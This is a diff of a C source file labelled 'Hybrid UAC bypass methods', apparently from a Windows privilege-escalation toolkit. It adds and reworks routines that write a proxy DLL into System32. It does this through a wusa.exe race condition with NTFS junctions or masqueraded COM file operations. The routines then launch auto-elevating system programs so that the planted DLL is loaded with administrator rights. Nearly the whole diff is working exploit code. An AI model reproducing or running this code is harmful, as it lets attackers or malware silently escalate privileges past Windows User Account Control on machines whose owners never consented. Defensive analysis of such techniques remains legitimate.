@@ -4,9 +4,9 @@
 *
 *  TITLE:       HYBRIDS.C
 *
-*  VERSION:     3.55
+*  VERSION:     3.57
 *
-*  DATE:        02 Mar 2021
+*  DATE:        01 Nov 2021
 *
 *  Hybrid UAC bypass methods.
 *
@@ -31,7 +31,7 @@
 *
 */
 BOOL ucmMethodCleanupSingleItemSystem32(
-    LPWSTR lpItemName
+    LPCWSTR lpItemName
 )
 {
     WCHAR szBuffer[MAX_PATH * 2];
@@ -51,8 +51,8 @@ BOOL ucmMethodCleanupSingleItemSystem32(
 *
 */
 NTSTATUS ucmxGenericAutoelevation(
-    _In_opt_ LPWSTR lpTargetApp,
-    _In_ LPWSTR lpTargetDll,
+    _In_opt_ LPCWSTR lpTargetApp,
+    _In_ LPCWSTR lpTargetDll,
     _In_ PVOID ProxyDll,
     _In_ DWORD ProxyDllSize
 )
@@ -71,7 +71,7 @@ NTSTATUS ucmxGenericAutoelevation(
     _strcpy(lpSource, g_ctx->szTempDirectory);
     _strcat(lpSource, lpTargetDll);
     nLen = _strlen(lpSource);
-    lpSource[nLen - 1] = L'!';
+    lpSource[nLen - 1] = UCM_TRASH_END_CHAR;
 
     //write proxy dll to disk
     if (supWriteBufferToFile(lpSource, ProxyDll, ProxyDllSize)) {
@@ -86,7 +86,7 @@ NTSTATUS ucmxGenericAutoelevation(
             _strcpy(lpSource, szDest);
             _strcat(lpSource, lpTargetDll);
             nLen = _strlen(lpSource);
-            lpSource[nLen - 1] = L'!';
+            lpSource[nLen - 1] = UCM_TRASH_END_CHAR;
 
             if (ucmMasqueradedRenameElementCOM(lpSource, lpTargetDll)) {
 
@@ -362,6 +362,30 @@ NTSTATUS ucmxDisemer()
     return STATUS_ACCESS_DENIED;
 }
 
+#define DISM_DLL_NAMES 2
+LPCWSTR g_DismTargets[DISM_DLL_NAMES] = {
+    DISMCORE_DLL,
+    APISET_KERNEL32LEGACY
+};
+
+/*
+* ucmDismMethodCleanup
+*
+* Purpose:
+*
+* Cleanup routine for Dism method.
+*
+*/
+VOID ucmDismMethodCleanup(VOID)
+{
+    DWORD i, cNames;
+    cNames = (g_ctx->dwBuildNumber < NT_WIN10_20H1) ? 1 : DISM_DLL_NAMES;
+
+    for (i = 0; i < cNames; i++) {
+        ucmMethodCleanupSingleItemSystem32(g_DismTargets[i]);
+    }
+}
+
 /*
 * ucmDismMethod
 *
@@ -382,38 +406,38 @@ NTSTATUS ucmDismMethod(
 )
 {
     NTSTATUS MethodResult = STATUS_ACCESS_DENIED;
-
-    LPWSTR lpTargetDll;
-
+    DWORD i, cNames;
     SIZE_T  nLen;
+
     WCHAR   szSource[MAX_PATH * 2];
 
-    if (g_ctx->dwBuildNumber < NT_WIN10_20H1) {
-        lpTargetDll = DISMCORE_DLL;
-    }
-    else {
-        lpTargetDll = APISET_KERNEL32LEGACY;
+    cNames = (g_ctx->dwBuildNumber < NT_WIN10_20H1) ? 1 : DISM_DLL_NAMES;
+    
+    for (i = 0; i < cNames; i++) {
+
+        MethodResult = ucmxGenericAutoelevation(NULL,
+            g_DismTargets[i],
+            ProxyDll,
+            ProxyDllSize);
+
+        if (NT_SUCCESS(MethodResult)) {
+            MethodResult = ucmxDisemer();
+        }
+
+        //
+        // Cleanup temp.
+        //
+        if (!NT_SUCCESS(MethodResult)) {
+            _strcpy(szSource, g_ctx->szTempDirectory);
+            _strcat(szSource, g_DismTargets[i]);
+            nLen = _strlen(szSource);
+            szSource[nLen - 1] = UCM_TRASH_END_CHAR;
+            DeleteFile(szSource);
+        }
+
+        Sleep(1000);
     }
 
-    MethodResult = ucmxGenericAutoelevation(NULL,
-        lpTargetDll,
-        ProxyDll,
-        ProxyDllSize);
-
-    if (NT_SUCCESS(MethodResult)) {
-        MethodResult = ucmxDisemer();
-    }
-
-    //
-    // Cleanup temp.
-    //
-    if (!NT_SUCCESS(MethodResult)) {
-        _strcpy(szSource, g_ctx->szTempDirectory);
-        _strcat(szSource, lpTargetDll);
-        nLen = _strlen(szSource);
-        szSource[nLen - 1] = L'!';
-        DeleteFile(szSource);
-    }
     return MethodResult;
 }
 
@@ -565,330 +589,6 @@ NTSTATUS ucmUiAccessMethod(
     } while (FALSE);
 
     return MethodResult;
-}
-
-/*
-* ucmJunctionMethodPreNetfx48
-*
-* Purpose:
-*
-* Bypass UAC using two different steps:
-*
-* 1) Create wusa.exe race condition and force wusa to copy files to the protected directory using NTFS reparse point.
-* 2) Dll hijack dotnet dependencies.
-*
-* Wusa race condition in combination with junctions found by Thomas Vanhoutte.
-*
-*/
-NTSTATUS ucmJunctionMethodPreNetfx48(
-    _In_ PVOID ProxyDll,
-    _In_ DWORD ProxyDllSize
-)
-{
-    NTSTATUS MethodResult = STATUS_ACCESS_DENIED;
-    BOOL bDropComplete = FALSE, bWusaNeedCleanup = FALSE;
-    HKEY hKey = NULL;
-    LRESULT lResult;
-
-    LPWSTR lpTargetDirectory = NULL, lpEnd = NULL;
-
-    DWORD i, cValues = 0, cbMaxValueNameLen = 0, bytesIO;
-
-    WCHAR szBuffer[MAX_PATH * 2];
-    WCHAR szSource[MAX_PATH * 2];
-    do {
-
-        //
-        // Drop payload dll to %temp% and make cab for it.
-        //
-        RtlSecureZeroMemory(szSource, sizeof(szSource));
-        _strcpy(szSource, g_ctx->szTempDirectory);
-
-        if (g_ctx->dwBuildNumber < NT_WIN8_BLUE) {
-            _strcat(szSource, OLE32_DLL);
-        }
-        else {
-            _strcat(szSource, MSCOREE_DLL);
-        }
-
-        bWusaNeedCleanup = ucmCreateCabinetForSingleFile(szSource, ProxyDll, ProxyDllSize, NULL);
-        if (!bWusaNeedCleanup)
-            break;
-
-        //
-        // Locate target directory.
-        //
-        lResult = RegOpenKeyEx(HKEY_LOCAL_MACHINE, T_DOTNET_CLIENT, 0, MAXIMUM_ALLOWED, &hKey);
-        if (lResult != ERROR_SUCCESS)
-            break;
-
-        lResult = RegQueryInfoKey(hKey,
-            NULL,
-            NULL,
-            NULL,
-            NULL,
-            NULL,
-            NULL,
-            &cValues,
-            &cbMaxValueNameLen,
-            NULL,
-            NULL,
-            NULL);
-
-        if (lResult != ERROR_SUCCESS)
-            break;
-
-        if ((cValues == 0) || (cbMaxValueNameLen == 0))
-            break;
-
-        if (cbMaxValueNameLen > MAX_PATH)
-            break;
-
-        bDropComplete = FALSE;
-
-        //
-        // Drop file in each.
-        //
-        for (i = 0; i < cValues; i++) {
-
-            RtlSecureZeroMemory(&szBuffer, sizeof(szBuffer));
-            bytesIO = MAX_PATH;
-
-            lResult = RegEnumValue(hKey,
-                i,
-                (LPWSTR)&szBuffer,
-                &bytesIO,
-                NULL,
-                NULL,
-                NULL,
-                NULL);
-
-            lpTargetDirectory = _filepath(szBuffer, szBuffer);
-            if (lpTargetDirectory == NULL) {
-                bDropComplete = FALSE;
-                break;
-            }
-
-            lpEnd = _strend(lpTargetDirectory);
-            if (*(lpEnd - 1) == TEXT('\\'))
-                *(lpEnd - 1) = TEXT('\0');
-
-            if (!ucmWusaExtractViaJunction(lpTargetDirectory)) {
-                bDropComplete = FALSE;
-                break;
-            }
-
-            bDropComplete = TRUE;
-        }
-
-        if (!bDropComplete)
-            break;
-
-        //
-        // Exploit dll hijacking.
-        //
-        RtlSecureZeroMemory(szBuffer, sizeof(szBuffer));
-        _strcpy(szBuffer, g_ctx->szSystemDirectory);
-        _strcat(szBuffer, DCOMCNFG_EXE);
-        if (supRunProcess(szBuffer, NULL))
-            MethodResult = STATUS_SUCCESS;
-
-
-    } while (FALSE);
-
-    if (hKey != NULL)
-        RegCloseKey(hKey);
-
-    if (bWusaNeedCleanup) {
-
-        //
-        // Remove cabinet file if exist.
-        //
-        ucmWusaCabinetCleanup();
-    }
-
-    return MethodResult;
-}
-
-/*
-* ucmJunctionMethod
-*
-* Purpose:
-*
-* Bypass UAC using two different steps:
-*
-* 1) Create wusa.exe race condition and force wusa to copy files to the protected directory using NTFS reparse point.
-* 2) Depending on Netfx available version hijack pkgmgr.exe using dll search order abuse or hijack dotnet dependencies for dcomcnfg.exe
-*
-* Wusa race condition in combination with junctions found by Thomas Vanhoutte.
-* 
-* Note:
-* This method final part is similar to Dism method.
-*
-*/
-NTSTATUS ucmJunctionMethod(
-    _In_ PVOID ProxyDll,
-    _In_ DWORD ProxyDllSize
-)
-{
-    NTSTATUS MethodResult = STATUS_ACCESS_DENIED;
-    BOOL bWusaNeedCleanup = FALSE;
-
-    LPWSTR lpEnd = NULL, lpTargetDll;
-
-    WCHAR szBuffer[MAX_PATH * 2];
-
-    if (supIsNetfx48PlusInstalled() == FALSE)
-        return ucmJunctionMethodPreNetfx48(ProxyDll, ProxyDllSize);
-
-    do {
-
-        if (g_ctx->dwBuildNumber < NT_WIN10_20H1) {
-            lpTargetDll = DISMCORE_DLL;
-        }
-        else {
-            lpTargetDll = APISET_KERNEL32LEGACY;
-        }
-
-        //
-        // Drop payload dll to %temp% and make cab for it.
-        //
-        RtlSecureZeroMemory(szBuffer, sizeof(szBuffer));
-        _strcpy(szBuffer, g_ctx->szTempDirectory);
-        _strcat(szBuffer, lpTargetDll);
-
-        bWusaNeedCleanup = ucmCreateCabinetForSingleFile(szBuffer, ProxyDll, ProxyDllSize, NULL);
-        if (!bWusaNeedCleanup)
-            break;
-
-        _strcpy(szBuffer, g_ctx->szSystemDirectory);
-
-        lpEnd = _strend(szBuffer);
-        if (*(lpEnd - 1) == TEXT('\\'))
-            *(lpEnd - 1) = TEXT('\0');
-
-        if (!ucmWusaExtractViaJunction(szBuffer))
-            break;
-
-        Sleep(2000);
-
-        MethodResult = ucmxDisemer();
-
-    } while (FALSE);
-
-
-    if (bWusaNeedCleanup) {
-
-        //
-        // Remove cabinet file if exist.
-        //
-        ucmWusaCabinetCleanup();
-    }
-
-    return MethodResult;
-}
-
-/*
-* ucmJunctionMethodCleanup
-*
-* Purpose:
-*
-* Post execution cleanup routine for JunctionMethod.
-*
-*/
-BOOL ucmJunctionMethodCleanup(
-    VOID
-)
-{
-    BOOL bResult = FALSE;
-
-    HKEY hKey = NULL;
-    LRESULT lResult;
-
-    LPWSTR lpTargetDirectory = NULL, lpEnd = NULL, lpTargetDll = NULL;
-
-    DWORD i, cValues = 0, cbMaxValueNameLen = 0, bytesIO;
-
-    WCHAR szBuffer[MAX_PATH * 2];
-
-    if (supIsNetfx48PlusInstalled()) {
-        return ucmMethodCleanupSingleItemSystem32(DISMCORE_DLL);
-    }
-
-    do {
-
-        if (g_ctx->dwBuildNumber < NT_WIN8_BLUE) {
-            lpTargetDll = OLE32_DLL;
-        }
-        else {
-            lpTargetDll = MSCOREE_DLL;
-        }
-
-        //
-       // Locate target directory.
-       //
-        lResult = RegOpenKeyEx(HKEY_LOCAL_MACHINE, T_DOTNET_CLIENT, 0, MAXIMUM_ALLOWED, &hKey);
-        if (lResult != ERROR_SUCCESS)
-            break;
-
-        lResult = RegQueryInfoKey(hKey,
-            NULL,
-            NULL,
-            NULL,
-            NULL,
-            NULL,
-            NULL,
-            &cValues,
-            &cbMaxValueNameLen,
-            NULL,
-            NULL,
-            NULL);
-
-        if (lResult != ERROR_SUCCESS)
-            break;
-
-        if ((cValues == 0) || (cbMaxValueNameLen == 0))
-            break;
-
-        if (cbMaxValueNameLen > MAX_PATH)
-            break;
-
-        //
-        // Delete target file in each.
-        //
-        for (i = 0; i < cValues; i++) {
-
-            RtlSecureZeroMemory(&szBuffer, sizeof(szBuffer));
-            bytesIO = MAX_PATH;
-
-            lResult = RegEnumValue(hKey,
-                i,
-                (LPWSTR)&szBuffer,
-                &bytesIO,
-                NULL,
-                NULL,
-                NULL,
-                NULL);
-
-            lpTargetDirectory = _filepath(szBuffer, szBuffer);
-            if (lpTargetDirectory == NULL) {
-                break;
-            }
-
-            lpEnd = _strend(lpTargetDirectory);
-            if (*(lpEnd - 1) != TEXT('\\'))
-                _strcat(lpEnd, TEXT("\\"));
-
-            _strcat(szBuffer, lpTargetDll);
-
-            ucmMasqueradedDeleteDirectoryFileCOM(szBuffer);
-        }
-
-        bResult = TRUE;
-
-    } while (FALSE);
-
-    return bResult;
 }
 
 /*
@@ -1288,6 +988,72 @@ NTSTATUS ucmDccwCOMMethod(
 
     if (hr_init == S_OK)
         CoUninitialize();
+
+    return MethodResult;
+}
+
+/*
+* ucmJunctionMethod
+*
+* Purpose:
+*
+* Bypass UAC using two different steps:
+*
+* 1) Create wusa.exe race condition and force wusa to copy files to the protected directory using NTFS reparse point.
+* 2) Disemer
+*
+* Wusa race condition in combination with junctions found by Thomas Vanhoutte.
+*
+*/
+NTSTATUS ucmJunctionMethod(
+    _In_ PVOID ProxyDll,
+    _In_ DWORD ProxyDllSize
+)
+{
+    NTSTATUS MethodResult = STATUS_ACCESS_DENIED;
+
+    DWORD i, cNames;
+
+    LPWSTR lpEnd;
+
+    WCHAR szBuffer[MAX_PATH * 2];
+
+    //
+    // Drop payload dll to %temp% and make cab for it.
+    //
+    cNames = (g_ctx->dwBuildNumber < NT_WIN10_20H1) ? 1 : DISM_DLL_NAMES;
+
+    for (i = 0; i < cNames; i++) {
+
+        RtlSecureZeroMemory(szBuffer, sizeof(szBuffer));
+        _strcpy(szBuffer, g_ctx->szTempDirectory);
+        _strcat(szBuffer, g_DismTargets[i]);
+
+        if (ucmCreateCabinetForSingleFile(szBuffer, ProxyDll, ProxyDllSize, NULL)) {
+
+            _strcpy(szBuffer, g_ctx->szSystemDirectory);
+
+            lpEnd = _strend(szBuffer);
+            if (*(lpEnd - 1) == TEXT('\\'))
+                *(lpEnd - 1) = TEXT('\0');
+
+            if (ucmWusaExtractViaJunction(szBuffer)) {
+
+                //
+                // Run target.
+                //
+                MethodResult = ucmxDisemer();
+
+            }
+
+            ucmWusaCabinetCleanup();
+        }
+
+    }
+
+#ifdef _DEBUG
+    supSetGlobalCompletionEvent();
+#endif
 
     return MethodResult;
 }
